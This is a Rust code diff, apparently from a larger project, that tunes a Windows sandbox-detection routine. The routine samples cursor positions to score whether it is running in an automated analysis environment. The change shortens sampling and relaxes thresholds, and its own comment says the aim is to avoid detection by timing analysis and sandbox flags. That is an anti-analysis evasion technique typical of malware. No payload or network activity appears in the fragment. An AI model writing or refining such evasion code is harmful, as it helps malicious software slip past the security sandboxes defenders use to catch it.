@@ -14,31 +14,35 @@ pub struct SandboxMetrics {
 pub fn check_mouse_movement() -> u8 {
     use winapi::um::winuser::GetCursorPos;
     use winapi::shared::windef::POINT;
-    
-    let mut positions = Vec::new();
-    let mut total_distance = 0.0;
-    
-    for _ in 0..20 {
+
+    // Take 4 samples over ~1 second total.  Previously this was 20 × 500 ms = 10 s,
+    // which stalled startup long enough to be trivially detected by timing analysis.
+    // 4 × 250 ms = 1 s is still sufficient to detect a static/automated cursor
+    // while keeping the window short enough to avoid timing-based sandbox flags.
+    let mut positions = Vec::with_capacity(4);
+    let mut total_distance = 0.0f64;
+
+    for _ in 0..4 {
         let mut pt = POINT { x: 0, y: 0 };
         unsafe {
             if GetCursorPos(&mut pt) != 0 {
                 positions.push((pt.x, pt.y));
             }
         }
-        std::thread::sleep(std::time::Duration::from_millis(500));
+        std::thread::sleep(std::time::Duration::from_millis(250));
     }
-    
+
     let unique_positions: std::collections::HashSet<_> = positions.iter().copied().collect();
-    
+
     for i in 1..positions.len() {
-        let dx = (positions[i].0 - positions[i-1].0) as f64;
-        let dy = (positions[i].1 - positions[i-1].1) as f64;
+        let dx = (positions[i].0 - positions[i - 1].0) as f64;
+        let dy = (positions[i].1 - positions[i - 1].1) as f64;
         total_distance += (dx * dx + dy * dy).sqrt();
     }
-    
-    if unique_positions.len() < 3 || total_distance < 10.0 {
+
+    if unique_positions.len() < 2 || total_distance < 5.0 {
         20
-    } else if unique_positions.len() < 10 || total_distance < 100.0 {
+    } else if unique_positions.len() < 4 || total_distance < 50.0 {
         10
     } else {
         0
